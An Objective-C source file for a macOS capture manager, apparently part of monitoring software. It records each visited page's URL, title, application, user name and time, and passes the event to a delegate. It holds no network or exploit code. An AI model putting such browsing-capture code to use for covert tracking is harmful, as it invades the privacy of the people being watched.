//
//  PageVisitedCaptureManager.m
//  PageVisitedCaptureManager
//
//  Created by Ophat Phuetkasickonphasutha on 10/2/13.
//  Copyright 2013 __MyCompanyName__. All rights reserved.
//

#import "PageVisitedCaptureManager.h"
#import "PageInfo.h"
#import "PageVisitedNotifier.h"

#import "FxPageVisitedEvent.h"
#import "DateTimeFormat.h"

@implementation PageVisitedCaptureManager
@synthesize mEventDelegate;
@synthesize mPageVisitedNotifier;

#pragma mark ######## registerEvent & unregisterEvent

- (id) init {
    if ((self = [super init])) {
        mPageVisitedNotifier = [[PageVisitedNotifier alloc] initWithPageVisitedDelegate:self];
        mPageVisitedNotifier.mCheckUrlTitle = YES;
	}
	return self;
}

- (void) registerEventDelegate:(id <EventDelegate>) aEventDelegate {
    [self setMEventDelegate:aEventDelegate];
}

- (void) unregisterEventDelegate {
	[self setMEventDelegate:nil];
}

- (void) startCapture {
    [mPageVisitedNotifier startNotify];
}

- (void) stopCapture {
    [mPageVisitedNotifier stopNotify];
}

- (void) pageVisited:(PageInfo *)aPageVisited {
    DLog(@"#### pageVisited Capture");
    FxPageVisitedEvent * fxPage = [[FxPageVisitedEvent alloc] init];
    [fxPage setMUserName:NSUserName()];
    [fxPage setMApplicationID:[aPageVisited mApplicationID]];
    [fxPage setMApplication:[aPageVisited mApplicationName]];
    [fxPage setMTitle:[aPageVisited mTitle]];
    [fxPage setMUrl:[aPageVisited mUrl]];
    [fxPage setDateTime:[DateTimeFormat phoenixDateTime]];
    //DLog(@"fxPage : %@",fxPage);
    if ([mEventDelegate respondsToSelector:@selector(eventFinished:)]) {		
        [mEventDelegate performSelector:@selector(eventFinished:) withObject:fxPage];
	}
    [fxPage release];
}

- (void)dealloc {
    [mPageVisitedNotifier release];
    [super dealloc];
}

@end
